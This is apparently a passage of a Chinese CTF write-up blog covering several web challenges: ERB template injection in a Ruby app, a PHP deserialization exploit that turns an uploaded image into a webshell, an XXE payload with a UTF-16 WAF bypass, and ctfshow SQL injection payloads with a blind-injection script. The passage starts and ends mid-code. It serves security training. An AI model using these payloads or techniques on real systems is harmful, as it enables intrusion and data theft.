punctuation">&#123;</span> <span class="token symbol">algorithm</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'HS256'</span></span> <span class="token punctuation">&#125;</span>  json<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token symbol">uid</span><span class="token operator">:</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"uid"</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token symbol">jkl</span><span class="token operator">:</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"jkl"</span></span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">end</span>get <span class="token string-literal"><span class="token string">"/shop"</span></span> <span class="token keyword">do</span>  erb <span class="token symbol">:shop</span><span class="token keyword">end</span>get <span class="token string-literal"><span class="token string">"/work"</span></span> <span class="token keyword">do</span>  islogin  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>decode cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token symbol">algorithm</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'HS256'</span></span> <span class="token punctuation">&#125;</span>  auth <span class="token operator">=</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token keyword">unless</span> params<span class="token punctuation">[</span><span class="token symbol">:SECRET</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">nil</span><span class="token operator">?</span>    <span class="token keyword">if</span> <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span><span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">params<span class="token punctuation">[</span><span class="token symbol">:SECRET</span><span class="token punctuation">]</span><span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token regex-literal"><span class="token regex">/[0-9a-z]+/</span></span><span class="token punctuation">)</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>      puts <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"FLAG"</span></span><span class="token punctuation">]</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span>  <span class="token keyword">if</span> params<span class="token punctuation">[</span><span class="token symbol">:do</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">params<span class="token punctuation">[</span><span class="token symbol">:name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> is working"</span></span> <span class="token keyword">then</span>    auth<span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"jkl"</span></span><span class="token punctuation">]</span> <span class="token operator">=</span> auth<span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"jkl"</span></span><span class="token punctuation">]</span><span class="token punctuation">.</span>to_i <span class="token operator">+</span> SecureRandom<span class="token punctuation">.</span>random_number<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>encode auth<span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">'HS256'</span></span>    cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth    <span class="token constant">ERB</span><span class="token double-colon punctuation">::</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"&lt;script>alert('</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">params<span class="token punctuation">[</span><span class="token symbol">:name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> working successfully!')&lt;/script>"</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>result  <span class="token keyword">end</span><span class="token keyword">end</span>post <span class="token string-literal"><span class="token string">"/shop"</span></span> <span class="token keyword">do</span>  islogin  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>decode cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token symbol">algorithm</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'HS256'</span></span> <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"jkl"</span></span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token constant">FLAGPRICE</span> <span class="token keyword">then</span>    json<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token symbol">title</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"error"</span></span><span class="token punctuation">,</span><span class="token symbol">message</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"no enough jkl"</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">else</span>    auth <span class="token operator">&lt;&lt;</span> <span class="token punctuation">&#123;</span><span class="token symbol">flag</span><span class="token operator">:</span> <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"FLAG"</span></span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>    auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>encode auth<span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">'HS256'</span></span>    cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth    json<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token symbol">title</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"success"</span></span><span class="token punctuation">,</span><span class="token symbol">message</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"jkl is good thing"</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">end</span><span class="token keyword">end</span><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">islogin</span></span>  <span class="token keyword">if</span> cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">nil</span><span class="token operator">?</span> <span class="token keyword">then</span>    redirect to<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'/shop'</span></span><span class="token punctuation">)</span>  <span class="token keyword">end</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到使用了REB包，是<a href="ruby/erb%E7%9A%84%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5">ruby/erb的模版注入</a></p><p>大概内容就是使用<code>&lt;%=</code>标签可以执行ruby语句并将结果转换为字符串，而题中有 <code>if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then</code>这句判定，在判定相等的时候会返回<code>#&#123;params[:name][0,7]&#125; working successfully!</code>，我们如果把name位置构造成我们想要的参量就可以拿到我们想要的内容</p><p>尝试传入$0（当前运行app名称）发现回显成功</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-16" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-16</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 23.23.05.png)</p><div class="table-container"><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>1</td><td><strong>$！</strong>提出的最后一个异常对象。也可以在<em>rescue</em>子句中使用=&gt;来访问异常对象。</td></tr><tr><td>2</td><td>**$ @*<em>堆栈</em>回溯<em>募集的最后一个异常。堆栈</em>回溯*信息可以通过Exception＃backtrace方法检索最后一个异常。</td></tr><tr><td>3</td><td>**$ /*<em>输入记录分隔符（默认为换行符）。</em>获取，readline*等，将他们的输入记录分隔符作为可选参数。</td></tr><tr><td>4</td><td><strong>$</strong> 输出记录分隔符（默认为nil）。</td></tr><tr><td>5</td><td><strong>$，</strong>要打印的参数和Array＃join之间的输出分隔符（默认为nil）。您可以将数组明确指定给Array＃join。</td></tr><tr><td>6</td><td>**$;**split的默认分隔符（默认为nil）。您可以为String＃split指定明确的分隔符。</td></tr><tr><td>7</td><td><strong>$。</strong>从当前输入文件读取的最后一行的编号。相当于ARGF.lineno。</td></tr><tr><td>8</td><td>**$ &lt;**ARGF的同义词</td></tr><tr><td>9</td><td><strong>$&gt;</strong>$ defout的同义词。</td></tr><tr><td>10</td><td><strong>$ 0</strong>正在执行的当前Ruby程序的名称。</td></tr><tr><td>11</td><td>**$$**正在执行的当前Ruby程序的进程pid。</td></tr><tr><td>12</td><td><strong>$？</strong>最后一个进程的退出状态终止。</td></tr><tr><td>13</td><td><strong>$：</strong>$ LOAD_PATH的同义词。</td></tr><tr><td>14</td><td><strong>$ DEBUG</strong>如果指定了-d或–debug命令行选项，则为true。</td></tr><tr><td>15</td><td><strong>$ defout</strong><em>print</em>和<em>printf</em>的目标输出（默认<em>为$ stdout</em>）。</td></tr><tr><td>16</td><td><strong>$ F</strong>指定-a时接收<em>分割</em>输出的变量。如果指定-a命令行选项以及-p或-n选项，则设置此变量。</td></tr><tr><td>17</td><td><strong>$ FILENAME</strong>目前正在从ARGF读取的文件的名称。相当于ARGF.filename。</td></tr><tr><td>18</td><td><strong>$ LOAD_PATH</strong>一个数组，用于加载和要求方法加载文件时要保存要搜索的目录。</td></tr><tr><td>19</td><td><strong>$ SAFE</strong>安全级别0→不对外部提供（污染）数据执行检查。（默认）1→禁止使用污染数据的潜在危险操作。2→禁止对进程和文件进行潜在危险的操作。3→所有新创建的对象都被认为是污染的。4→禁止修改全局数据。</td></tr><tr><td>20</td><td><strong>$ stdin</strong>标准输入（默认为STDIN）。</td></tr><tr><td>21</td><td><strong>$ stdout</strong>标准输出（默认为STDOUT）。</td></tr><tr><td>22</td><td><strong>$ stderr</strong>标准错误（默认为STDERR）。</td></tr><tr><td>23</td><td><strong>$ VERBOSE</strong>如果指定了-v，-w或–verbose命令行选项，则为True。</td></tr><tr><td>24</td><td><strong>$ - x</strong>解释器选项-x（x = 0，a，d，F，i，K，l，p，v）的值。这些选项列在下面</td></tr><tr><td>25</td><td><strong>$ -0</strong>解释器选项-x的值和$ /的别名。</td></tr><tr><td>26</td><td><strong>$ -a</strong>解释器选项-x的值，如果选项-a被设置，则为true。只读。</td></tr><tr><td>27</td><td><strong>$ -d</strong>解释器选项-x的值和$ DEBUG的别名</td></tr><tr><td>28</td><td><strong>$ -F</strong>解释器选项-x和别名$ ;.</td></tr><tr><td>29</td><td><strong>$ -i</strong>解释器选项-x和in-place-edit模式的值保存扩展名，否则为nil。可以启用或禁用就地编辑模式。</td></tr><tr><td>30</td><td><strong>$ -I</strong>解释器选项-x的值和$：的别名。</td></tr><tr><td>31</td><td><strong>$ -l</strong>解释器选项-x的值，如果选项-lis设置为true。只读。</td></tr><tr><td>32</td><td><strong>$ -p</strong>解释器选项-x的值，如果选项-pis设置为true。只读。</td></tr><tr><td>33</td><td>**$ _**局部变量，最后一个字符string通过gets或readline在当前作用域中读取。</td></tr><tr><td>34</td><td><strong>$〜</strong>与最后一场比赛相关的局部变量<em>MatchData</em>。Regex＃match方法返回最后一个匹配信息。</td></tr><tr><td>35</td><td><strong>$ n（$ 1，$ 2，$ 3 …）</strong>在最后一个模式匹配的第n组中匹配的字符string。相当于m [n]，其中m是<em>MatchData</em>对象。</td></tr><tr><td>36</td><td><strong>$＆</strong>在最后一个模式匹配中匹配的字符string。相当于m [0]，其中m是<em>MatchData</em>对象。</td></tr><tr><td>37</td><td>**$’*<em>在最后一个模式匹配的匹配之前的字符string。相当于m.pre_match，其中m是</em>MatchData*对象。</td></tr><tr><td>38</td><td>**$”**匹配后的字符string在最后一个模式匹配。相当于m.post_match，其中m是MatchData对象。</td></tr><tr><td>39</td><td>**$ +**与最后一个模式匹配的最后一个成功匹配的组对应的字符string。</td></tr></tbody></table></div><p>这里我们使用第37个，因为在上面最后一次匹配的就是我们想要的密钥</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">SECRET&#x3D;&amp;name&#x3D;%3C%25%3D%24&#39;%25%3E&amp;do&#x3D;%3C%25%3D%24&#39;%25%3E%20is%20working<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到密钥，直接改钱拿flag</p>        <h2 id="GKCTF-2021-easycms"   >          <a href="#GKCTF-2021-easycms" class="heading-link"><i class="fas fa-link"></i></a><a href="#GKCTF-2021-easycms" class="headerlink" title="[GKCTF 2021]easycms"></a>[GKCTF 2021]easycms</h2>      <p>提示说后台5位弱口令，点登录注册都没啥反应，推测可能是后台界面，/admin.php，admin/12345登录成功</p><p>下一步在设计——主题中，对主题进行编辑后可以导出主题，存在任意文件读取漏洞，直接将theme参量换成base64(/flag)即可</p><p>还有另一种方式，在设计——自定义——首页——编辑中可以自行添加php代码，此时需要我们添加文件来验证身份，在设计——组件——素材库——上传素材中存在目录穿越，传入../../../../../system/tmp/xxxx即可，最后保存访问主页就行</p>        <h2 id="强网杯-2019-Upload"   >          <a href="#强网杯-2019-Upload" class="heading-link"><i class="fas fa-link"></i></a><a href="#强网杯-2019-Upload" class="headerlink" title="[强网杯 2019]Upload"></a>[强网杯 2019]Upload</h2>      <p>注册登录，上传测试，发现上传后文件都会被重命名并且后缀被更改为png，估计也没啥上传办法了，看一下cookie，发现是一串banse64编码后的序列化字符串，解码发现其中有头像img文件路径，尝试目录穿越读取文件，失败</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-17" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-17</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 11.35.50.png)</p><p>扫！得到源码，来看上传文件，代码审计，审计完发现在每次登录的身份认证中都含有<code>login_check</code>，其中可以进行反序列化，看到Profile类中</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">except</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">//构造except['index']='img'，$img='upload_img'来调用upload_img方法</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token punctuation">&#123;</span><span class="token variable">$name</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token punctuation">&#123;</span><span class="token variable">$name</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后就是整个反序列化链了，</p><pre class="line-numbers language-none"><code class="language-none">Register::__destruct-&gt;Profile::upload_img通过此处@copy($this-&gt;filename_tmp, $this-&gt;filename);@unlink($this-&gt;filename_tmp);$this-&gt;img&#x3D;&quot;..&#x2F;upload&#x2F;$this-&gt;upload_menu&#x2F;$this-&gt;filename&quot;;将我们构造好的图片马更名并保存，构造如下exp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">//exp.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>web<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Profile</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$checker</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename_tmp</span><span class="token operator">=</span><span class="token string double-quoted-string">"./upload/c47b21fcf8f0bc8b3920541abd8024fd/a13d380e153c641dd3cfd5b1273d984b.png"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string double-quoted-string">"./upload/c47b21fcf8f0bc8b3920541abd8024fd/1.php"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$upload_menu</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$ext</span><span class="token operator">=</span><span class="token string double-quoted-string">"png"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$img</span><span class="token operator">=</span><span class="token string double-quoted-string">"upload_img"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$except</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"index"</span><span class="token operator">=></span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Register</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$checker</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$registed</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Profile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">checker</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="CSAWQual-2019-Web-Unagi"   >          <a href="#CSAWQual-2019-Web-Unagi" class="heading-link"><i class="fas fa-link"></i></a><a href="#CSAWQual-2019-Web-Unagi" class="headerlink" title="[CSAWQual 2019]Web_Unagi"></a>[CSAWQual 2019]Web_Unagi</h2>      <p>就差告诉你XXE了，尝试上传一哈</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY kkk SYSTEM "file:///flag"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>users</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>alice<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>passwd1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&kkk;">&amp;kkk;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>email</span><span class="token punctuation">></span></span>alice@fakesite.com<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>email</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>group</span><span class="token punctuation">></span></span>CSAW2019<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>group</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>intro</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&kkk;">&amp;kkk;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>intro</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>bob<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>passwd2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>Bob<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>email</span><span class="token punctuation">></span></span>bob@fakesite.com<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>email</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>group</span><span class="token punctuation">></span></span>CSAW2019<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>group</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>intro</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&kkk;">&amp;kkk;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>intro</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>users</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>被WAF拦截了，选择编码绕过</p><blockquote><p>除了前面提到的xml文档的三个部分之外，还有位于它们之上的第四个部分，它们控制文档的编码（例如<?xml?>）——文档的第一个字节带有可选的BOM(字节顺序标记)。<br>更多信息：<span class="exturl"><a class="exturl__link"   href="https://www.w3.org/TR/xml/#sec-guessing" >https://www.w3.org/TR/xml/#sec-guessing</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。<br>在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集。<br>外来编码也可用于绕过成熟的WAF，因为它们并不总是能够处理上面列出的所有编码。例如，libxml2解析器只支持一种类型的utf-32 - utf-32BE，特别是不支持BOM。</p></blockquote><p>使用命令更改编码</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">cat</span> <span class="token number">1</span>.xml <span class="token operator">|</span> <span class="token function">iconv</span> <span class="token parameter variable">-f</span> UTF-8 <span class="token parameter variable">-t</span> UTF-16BE <span class="token operator">></span> x16.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>记得吧内容放到intro中，不然会被裁切</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>https://blog.gem-love.com/ctf/2283.html注入</title>
      <link href="/posts/38885.html"/>
      <url>/posts/38885.html</url>
      
        <content type="html"><![CDATA[<p><strong>171</strong></p><p>入门开始，直接union select</p><pre class="line-numbers language-none"><code class="language-none">database:ctfshow_webtable:ctfshow_user0&#39; union select 1,2,group_concat(password) from ctfshow_web.ctfshow_user --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>172</strong></p><pre class="line-numbers language-none"><code class="language-none">database:ctfshow_webtable:ctfshow_user20&#39; union select 1,group_concat(password) from ctfshow_web.ctfshow_user2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>173</strong></p><pre class="line-numbers language-none"><code class="language-none">database:ctfshow_webtable:ctfshow_user30&#39; union select 1,2,group_concat(password) from ctfshow_web.ctfshow_user3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>174</strong></p><p>返回内容中不能有数字了，试试布尔注入吧</p><p>select * from tableName limit i,n</p><p>i为索引，n为数量</p><p>随便写的垃圾脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://5d04fd50-8b1c-40fc-9f33-520ecb876ab5.challenge.ctf.show/api/v4.php?id=1'and 1=     &amp;page=1&amp;limit=10"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">57</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        sql <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((select password from ctfshow_user4 limit 24,1),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">,1,0)"</span></span>        url<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"http://5d04fd50-8b1c-40fc-9f33-520ecb876ab5.challenge.ctf.show/api/v4.php?id=1'and 1=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">--+&amp;page=1&amp;limit=10"</span></span>        tex<span class="token operator">=</span>requests<span class="token 